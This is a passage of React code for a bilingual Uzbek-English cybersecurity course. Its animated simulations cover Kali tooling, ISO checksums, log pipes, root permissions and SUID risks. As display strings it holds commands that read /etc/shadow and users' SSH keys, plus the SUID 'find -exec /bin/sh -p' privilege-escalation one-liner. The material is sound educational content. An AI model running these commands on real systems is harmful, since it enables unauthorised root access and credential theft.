    {col:AM,uz:"hydra allaqachon o'rnatilgan — «05 – Password Attacks» bo'limida turibdi",en:"hydra is already installed — sitting under «05 – Password Attacks»",duz:"600+ vosita oldindan o'rnatilgan holda menyuda tartiblangan.",den:"600+ tools come preinstalled, organized right in the menu."},
    {col:AM,uz:"rockyou.txt wordlist ham /usr/share/wordlists papkasida tayyor",en:"The rockyou.txt wordlist is already sitting in /usr/share/wordlists",duz:"Vosita HAM, unga kerakli ma'lumot HAM birga keladi.",den:"Both the tool AND the data it needs arrive together."},
    {col:A,uz:"⚡ 10 soniyada boshlash mumkin — hammasi tayyor turibdi",en:"⚡ Ready to start in 10 seconds — everything is already there",duz:"O'rnatish emas, faqat vazifaning o'ziga vaqt sarflanadi.",den:"Time goes into the actual task, not into installing things.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="reg"?REG:KALI;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="reg"?REG:run==="kali"?KALI:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu vazifani oddiy OS va Kali'da bajarish qanchalik farq qilishini ko'ring.","⬇ Pick a scenario — see how doing the same task differs on a regular OS versus Kali.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="reg"?t(lang,"✗ Oddiy OS: har bir vosita uchun qidirish+o'rnatish+sozlash","✗ Regular OS: search + install + configure for every single tool"):t(lang,"✓ Kali: vosita va ma'lumot menyuda tayyor kutib turibdi","✓ Kali: the tool and the data are already waiting in the menu")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("reg");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reg"?D+"22":SL2,color:run==="reg"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🐧 Oddiy OS (Ubuntu)","🐧 Regular OS (Ubuntu)")),
      React.createElement("button",{onClick:()=>{setRun("kali");setStep(-1);},style:{flex:1,padding:"9px",background:run==="kali"?A+"22":SL2,color:run==="kali"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🦂 Kali Linux","🦂 Kali Linux"))));
}

function ISOVerifySim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const OK=[
    {col:BL,uz:"ISO fayl rasmiy kali.org saytidan yuklab olindi",en:"The ISO file is downloaded from the official kali.org site",duz:"Manba — Kali jamoasining o'zi.",den:"The source is the Kali team itself."},
    {col:AM,uz:"sha256sum hisoblanadi:  3c3e1e9a7f...",en:"sha256sum is computed:  3c3e1e9a7f...",duz:"Bu — faylning yagona «raqamli barmoq izi».",den:"This is the file's unique «digital fingerprint»."},
    {col:AM,uz:"Rasmiy saytdagi e'lon qilingan qiymat bilan solishtiriladi",en:"It's compared against the value published on the official site",duz:"Ikkala qiymat baytma-bayt tenglashtiriladi.",den:"Both values are compared byte for byte."},
    {col:A,uz:"✅ MOS KELDI — fayl asl, o'zgartirilmagan, xavfsiz o'rnatsa bo'ladi",en:"✅ MATCH — the file is genuine, unaltered, safe to install",duz:"Bitta bit ham o'zgarmagani matematik jihatdan tasdiqlandi.",den:"It's mathematically confirmed that not even a single bit changed.",final:true}
  ];
  const BAD=[
    {col:BL,uz:"ISO fayl ishonchsiz uchinchi tomon oynasi (mirror)'dan yuklab olindi",en:"The ISO file is downloaded from an untrusted third-party mirror",duz:"Tezroq bo'lishi mumkin, lekin manba tasdiqlanmagan.",den:"It might be faster, but the source is unverified."},
    {col:AM,uz:"sha256sum hisoblanadi:  9f61a2d4c8... (boshqacha qiymat)",en:"sha256sum is computed:  9f61a2d4c8... (a different value)",duz:"Fayl hajmi va nomi bir xil ko'rinsa ham, ichi boshqa.",den:"Even if the file size and name look the same, the contents differ."},
    {col:AM,uz:"Rasmiy saytdagi qiymat bilan solishtiriladi — MOS KELMAYDI",en:"It's compared to the official value — it DOESN'T MATCH",duz:"Hatto bitta bayt farq qilsa ham, butun hash boshqacha chiqadi.",den:"Even a single differing byte produces a completely different hash."},
    {col:D,uz:"⛔ Fayl buzilgan yoki ichiga zararli kod qo'shilgan bo'lishi mumkin",en:"⛔ The file may be corrupted or have malicious code injected into it",duz:"Bunday ISO'ni hech qachon o'rnatmang — backdoor bo'lishi mumkin.",den:"Never install an ISO like this — it could be a backdoor.",final:true,bad:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="ok"?OK:BAD;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="ok"?OK:run==="bad"?BAD:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bitta ISO haqiqiy manbadan, ikkinchisi shubhali manbadan kelganda tekshiruv qanday farq qilishini ko'ring.","⬇ Pick a scenario — see how the checksum check differs when one ISO comes from a genuine source and one from a suspicious one.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="ok"?t(lang,"✓ Tasdiqlangan — o'rnatishga tayyor","✓ Verified — safe to install"):t(lang,"✗ Rad etildi — bu ISO ishonib bo'lmaydi","✗ Rejected — this ISO cannot be trusted")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("ok");setStep(-1);},style:{flex:1,padding:"9px",background:run==="ok"?A+"22":SL2,color:run==="ok"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Rasmiy ISO","✅ Official ISO")),
      React.createElement("button",{onClick:()=>{setRun("bad");setStep(-1);},style:{flex:1,padding:"9px",background:run==="bad"?D+"22":SL2,color:run==="bad"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⛔ Shubhali ISO","⛔ Suspicious ISO"))));
}

function ManualVsPipeSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const MANUAL=[
    {col:BL,uz:"auth.log faylida 2000+ qatorli tizim jurnali bor",en:"auth.log holds a 2000+ line system journal",duz:"Vazifa: muvaffaqiyatsiz SSH kirish urinishlari sonini bilish.",den:"Task: find out how many failed SSH login attempts there were."},
    {col:AM,uz:"cat auth.log — barcha 2000+ qator ekranga bab-baravar oqib chiqadi",en:"cat auth.log — all 2000+ lines flood the screen at once",duz:"Terminalda faqat oxirgi ekran ko'rinadi, qolgani yuqoriga chiqib ketadi.",den:"Only the last screenful is visible — the rest scrolls off the top."},
    {col:AM,uz:"«Failed password» iborasini qo'lda ko'zdan kechirib sanash kerak",en:"Must manually scan for and count «Failed password» by eye",duz:"Diqqat toza bo'lmasa, ba'zi qatorlar osongina o'tkazib yuboriladi.",den:"Without perfect focus, some matching lines are easy to miss."},
    {col:D,uz:"😵 5+ daqiqa ketdi, natija baribir noaniq — ko'p urinish o'tkazib yuborilgan",en:"😵 5+ minutes spent, the result is still uncertain — many attempts were missed",duz:"Qo'lda sanash katta fayllarda ishonchli usul emas.",den:"Manual counting isn't a reliable method on large files.",final:true,bad:true}
  ];
  const PIPE=[
    {col:BL,uz:"auth.log faylida xuddi shu 2000+ qatorli jurnal bor",en:"auth.log holds the exact same 2000+ line journal",duz:"Bir xil vazifa, bir xil fayl — usul boshqacha.",den:"Same task, same file — only the method differs."},
    {col:AM,uz:"grep \"Failed password\" auth.log — faqat mos qatorlar qoladi",en:"grep \"Failed password\" auth.log — only matching lines remain",duz:"grep 2000 qatorni soniyaning ulushida ko'zdan kechiradi.",den:"grep scans all 2000 lines in a fraction of a second."},
    {col:AM,uz:"| wc -l — qolgan qatorlar avtomatik sanaladi",en:"| wc -l — the remaining lines are counted automatically",duz:"Ikkinchi buyruq birinchisining natijasini darhol qabul qiladi.",den:"The second command instantly takes the first one's output as input."},
    {col:A,uz:"⚡ 1 soniyada aniq javob: 342 — brute-force belgisi darhol ko'rinadi",en:"⚡ Exact answer in 1 second: 342 — a brute-force sign is immediately visible",duz:"Bitta qatorlik buyruq — inson xatosiz, to'liq va tezkor.",den:"One line of command — no human error, complete, and instant.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="manual"?MANUAL:PIPE;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="manual"?MANUAL:run==="pipe"?PIPE:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu 2000+ qatorli jurnalni qo'lda va quvur bilan tekshirishni solishtiring.","⬇ Pick a scenario — compare checking the same 2000+ line log by hand versus with a pipe.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="manual"?t(lang,"✗ Qo'lda: sekin va xatoga moyil","✗ By hand: slow and error-prone"):t(lang,"✓ Quvur bilan: tezkor va aniq","✓ With a pipe: instant and exact")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("manual");setStep(-1);},style:{flex:1,padding:"9px",background:run==="manual"?D+"22":SL2,color:run==="manual"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"😵 Qo'lda o'qish (cat)","😵 Read by hand (cat)")),
      React.createElement("button",{onClick:()=>{setRun("pipe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="pipe"?A+"22":SL2,color:run==="pipe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Quvur bilan (grep|wc)","⚡ With a pipe (grep|wc)"))));
}

function PermissionWalkSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const USERR=[
    {col:BL,uz:"$ cat /etc/passwd — muvaffaqiyatli o'qildi",en:"$ cat /etc/passwd — read successfully",duz:"Bu fayl atayin hammaga o'qishga ochiq qilingan.",den:"This file is deliberately made world-readable."},
    {col:AM,uz:"$ cat /etc/shadow — Permission denied",en:"$ cat /etc/shadow — Permission denied",duz:"Parol hashlarini faqat root o'qiy oladi.",den:"Only root can read the password hashes."},
    {col:AM,uz:"$ ls -la /home/boss/.ssh/ — Permission denied",en:"$ ls -la /home/boss/.ssh/ — Permission denied",duz:"Boshqa foydalanuvchining shaxsiy katalogi yopiq.",den:"Another user's private directory is closed off."},
    {col:D,uz:"🔒 Ko'p muhim fayl yopiq — chuqurroq kirish uchun imtiyoz oshirish kerak",en:"🔒 Many key files are locked — going deeper requires escalating privileges",duz:"Aynan shu devor Bo'lim 4 (Imtiyozlarni oshirish)ning asosiy mavzusi.",den:"This exact wall is the whole subject of Section 4 (Privilege Escalation).",final:true,bad:true}
  ];
  const ROOTR=[
    {col:BL,uz:"# cat /etc/passwd — muvaffaqiyatli o'qildi",en:"# cat /etc/passwd — read successfully",duz:"root uchun bu ham, keyingisi ham ochiq.",den:"For root, this — and everything next — is open."},
    {col:AM,uz:"# cat /etc/shadow — muvaffaqiyatli o'qildi, barcha hash'lar ko'rinadi",en:"# cat /etc/shadow — read successfully, all hashes visible",duz:"root ruxsat tekshiruvidan butunlay chetlab o'tadi.",den:"root bypasses the permission check entirely."},
    {col:AM,uz:"# ls -la /home/*/.ssh/ — barcha foydalanuvchilarning SSH kalitlari ko'rinadi",en:"# ls -la /home/*/.ssh/ — every user's SSH keys are visible",duz:"Hech qanday katalog root uchun yopiq emas.",den:"No directory is closed to root."},
    {col:A,uz:"🔓 Butun tizim ochiq — hech qanday cheklov yo'q",en:"🔓 The whole system is open — no restrictions at all",duz:"Shuning uchun root'ga ko'tarilish hujumchining asosiy maqsadi bo'ladi.",den:"That's exactly why escalating to root is the attacker's ultimate goal.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="user"?USERR:ROOTR;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="user"?USERR:run==="root"?ROOTR:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu 3 buyruqni oddiy foydalanuvchi va root sifatida ishga tushiring.","⬇ Pick a scenario — run the same 3 commands as a regular user versus as root.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0",fontFamily:"var(--font-mono)"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="user"?t(lang,"✗ Oddiy foydalanuvchi: ko'p joy yopiq","✗ Regular user: much of the tree is locked"):t(lang,"✓ root: hech qanday to'siq yo'q","✓ root: no barrier anywhere")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("user");setStep(-1);},style:{flex:1,padding:"9px",background:run==="user"?D+"22":SL2,color:run==="user"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"👤 Oddiy foydalanuvchi","👤 Regular user")),
      React.createElement("button",{onClick:()=>{setRun("root");setStep(-1);},style:{flex:1,padding:"9px",background:run==="root"?A+"22":SL2,color:run==="root"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"👑 root"))));
}

function SUIDRiskSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const SAFE=[
    {col:BL,uz:"/usr/bin/passwd fayli SUID+root — istalgan foydalanuvchi ishga tushira oladi",en:"/usr/bin/passwd is SUID+root — any user can run it",duz:"Parol o'zgartirish uchun vaqtincha root huquqi kerak, shuning uchun SUID atayin qo'yilgan.",den:"Changing a password briefly needs root rights, so SUID is deliberately set here."},
    {col:AM,uz:"Dastur ICHIDA qattiq nazorat bor — faqat o'z parolingizni o'zgartirishga ruxsat beradi",en:"Internally the program strictly limits itself — it only lets you change YOUR OWN password",duz:"Kod diqqat bilan yozilgan: hech qanday tashqi buyruq yoki fayl argumentini qabul qilmaydi.",den:"The code is carefully written: it accepts no external command or file argument."},
    {col:AM,uz:"Boshqa foydalanuvchi parolini yoki ixtiyoriy faylni o'zgartirish imkoni yo'q",en:"There's no way to change another user's password or an arbitrary file",duz:"Root huquqi faqat bitta tor vazifaga qat'iy cheklangan.",den:"The root privilege is tightly scoped to exactly one narrow task."},
    {col:A,uz:"🔒 SUID xavfsiz — dastur o'zini ongli ravishda cheklagan",en:"🔒 SUID is safe here — the program deliberately restricts itself",duz:"Xavfsiz SUID = kam, aniq belgilangan imkoniyat.",den:"Safe SUID = a small, precisely defined set of capabilities.",final:true}
  ];
  const RISKY=[
    {col:BL,uz:"Administrator xato bilan /usr/bin/find fayliga SUID+root o'rnatgan",en:"An admin mistakenly set SUID+root on /usr/bin/find",duz:"Ehtimol «vaqtincha» debgina, keyin olib tashlashni unutgan.",den:"Maybe set \"temporarily\" and never removed."},
    {col:AM,uz:"find'ning o'zida -exec bayrog'i bor — u ISTALGAN buyruqni ishga tushira oladi",en:"find itself has an -exec flag — it can launch ANY command at all",duz:"find bu uchun mo'ljallanmagan, lekin funksiyasi buni imkon qiladi.",den:"find wasn't designed for this, but its own feature allows it."},
    {col:AM,uz:"find . -exec /bin/sh -p \\; — buyruq SUID orqali root sifatida bajariladi",en:"find . -exec /bin/sh -p \\; — the command runs as root via SUID",duz:"-p bayrog'i sh'ga imtiyozlarni tashlab yubormaslikni buyuradi.",den:"The -p flag tells sh not to drop its elevated privileges."},
    {col:D,uz:"☠ Oddiy foydalanuvchi soniyada root bo'ldi — bitta noto'g'ri SUID yetarli edi",en:"☠ A regular user became root in seconds — one misconfigured SUID was enough",duz:"Bu — GTFOBins'da hujjatlashtirilgan eng klassik privesc texnikalaridan biri.",den:"This is one of the most classic privesc techniques, documented on GTFOBins.",final:true,bad:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="safe"?SAFE:RISKY;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="safe"?SAFE:run==="risky"?RISKY:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — SUID biti xavfsiz va xavfli dasturda qanday farqli oqibatga olib kelishini ko'ring.","⬇ Pick a scenario — see how the SUID bit leads to very different outcomes on a safe versus a risky program.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="safe"?t(lang,"✓ passwd: SUID to'g'ri cheklangan","✓ passwd: SUID is properly scoped"):t(lang,"✗ find: SUID to'g'ridan-to'g'ri root shell beradi","✗ find: SUID hands over a root shell directly")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("safe");setStep(-1);},style:{flex:1,padding:"9px",background:run==="safe"?A+"22":SL2,color:run==="safe"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 Xavfsiz SUID (passwd)","🔒 Safe SUID (passwd)")),
      React.createElement("button",{onClick:()=>{setRun("risky");setStep(-1);},style:{flex:1,padding:"9px",background:run==="risky"?D+"22":SL2,color:run==="risky"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ Xavfli SUID (find)","☠ Risky SUID (find)"))));
}

function AptUpdateSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const STALE=[
    {col:BL,uz:"sudo apt install gobuster — to'g'ridan-to'g'ri, update qilinmagan",en:"sudo apt install gobuster — installed directly, no update first",duz:"Tizim oxirgi marta 3 oy oldin yangilangan.",den:"The system was last refreshed 3 months ago."},
    {col:AM,uz:"Paket ro'yxati eski — gobuster'ning eskirgan manzili ko'rsatilgan",en:"The package list is stale — it points to an outdated gobuster location",duz:"apt hali ham 3 oy oldingi «xarita»ga ishonadi.",den:"apt still trusts the 3-month-old «map»."},
    {col:AM,uz:"404 Not Found — server bu eski manzilda paketni endi saqlamaydi",en:"404 Not Found — the server no longer hosts the package at that old address",duz:"Ombordagi fayllar ko'chirilgan yoki versiya almashtirilgan.",den:"The repo's files have moved or the version has changed."},
    {col:D,uz:"❌ O'rnatish muvaffaqiyatsiz — «Unable to fetch some archives»",en:"❌ Install fails — «Unable to fetch some archives»",duz:"Eskirgan xaritaga ishonish — vaqtni behuda sarflaydi.",den:"Trusting a stale map wastes real time.",final:true,bad:true}
  ];
  const FRESH=[
    {col:BL,uz:"sudo apt update — birinchi navbatda paket ro'yxati yangilanadi",en:"sudo apt update — the package list is refreshed first",duz:"Bu — har doim install'dan OLDIN bajariladigan qadam.",den:"This is the step that always comes BEFORE install."},
    {col:AM,uz:"Barcha ombordagi eng so'nggi manzillar va versiyalar olinadi",en:"The latest URLs and versions across all repositories are fetched",duz:"apt endi hozirgi, to'g'ri «xarita»ga ega.",den:"apt now holds a current, accurate «map»."},
    {col:AM,uz:"sudo apt install gobuster — endi to'g'ri, joriy manzildan yuklanadi",en:"sudo apt install gobuster — now downloads from the correct, current location",duz:"Xuddi shu buyruq, lekin endi to'g'ri xaritaga asoslangan.",den:"The exact same command, but now based on an accurate map."},
    {col:A,uz:"✅ O'rnatish muvaffaqiyatli — eng so'nggi versiya to'g'ri o'rnatildi",en:"✅ Install succeeds — the latest version installed correctly",duz:"Bir qatorlik odat — update — ko'p vaqtni tejaydi.",den:"One extra line of habit — update — saves real time.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="stale"?STALE:FRESH;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="stale"?STALE:run==="fresh"?FRESH:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu o'rnatish buyrug'i update'siz va update bilan qanday farq qilishini ko'ring.","⬇ Pick a scenario — see how the exact same install command differs with and without an update first.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="stale"?t(lang,"✗ Eski ro'yxat — o'rnatish yiqiladi","✗ Stale list — the install fails"):t(lang,"✓ Yangi ro'yxat — o'rnatish ishlaydi","✓ Fresh list — the install works")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("stale");setStep(-1);},style:{flex:1,padding:"9px",background:run==="stale"?D+"22":SL2,color:run==="stale"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ update'siz o'rnatish","❌ Install without update")),
      React.createElement("button",{onClick:()=>{setRun("fresh");setStep(-1);},style:{flex:1,padding:"9px",background:run==="fresh"?A+"22":SL2,color:run==="fresh"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ update, keyin install","✅ Update, then install"))));
}

function ManualVsScriptSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const MANUAL=[
    {col:BL,uz:"Vazifa: 254 ta IP (10.0.0.1–254) orasidan tirik xostlarni topish",en:"Task: find the live hosts among 254 IPs (10.0.0.1–254)",duz:"Hech qanday skript yo'q — hammasi qo'lda.",den:"No script — everything by hand."},
    {col:AM,uz:"ping -c1 10.0.0.1, ping -c1 10.0.0.2, ping -c1 10.0.0.3 ... har birini qo'lda terish",en:"ping -c1 10.0.0.1, then 10.0.0.2, then 10.0.0.3 ... typing each one by hand",duz:"Har bir buyruqdan keyin natijani ko'zdan kechirib, keyingisiga o'tish kerak.",den:"After each command you must read the result before moving to the next."},
    {col:AM,uz:"~50-IP atrofida charchoq boshlanadi — ba'zi raqamlar terilmasdan qoladi",en:"Around IP #50 fatigue sets in — some numbers get skipped or mistyped",duz:"Diqqat pasayadi, xuddi shu ishni 200+ marta qaytarish inson uchun mos emas.",den:"Attention fades — repeating the same action 200+ times isn't suited to a human."},
    {col:D,uz:"😩 25+ daqiqa, 254 ta buyruq qo'lda — bir nechtasi albatta o'tkazib yuborilgan",en:"😩 25+ minutes, 254 commands typed by hand — a few are inevitably missed",duz:"Aynan shu ish uchun bash skript yaratilgan.",den:"This is exactly the job bash scripting was invented for.",final:true,bad:true}
  ];
  const SCRIPT=[
    {col:BL,uz:"Vazifa: xuddi shu 254 ta IP orasidan tirik xostlarni topish",en:"Task: find the live hosts among the exact same 254 IPs",duz:"Bir marta yozilgan skript istalgancha marta ishlatiladi.",den:"A script written once can be reused any number of times."},
    {col:AM,uz:"for i in $(seq 1 254); do ... done — bitta sikl barcha 254 tasini qamrab oladi",en:"for i in $(seq 1 254); do ... done — one loop covers all 254 of them",duz:"Yozish atigi bir necha soniya oladi.",den:"Writing it takes only a few seconds."},
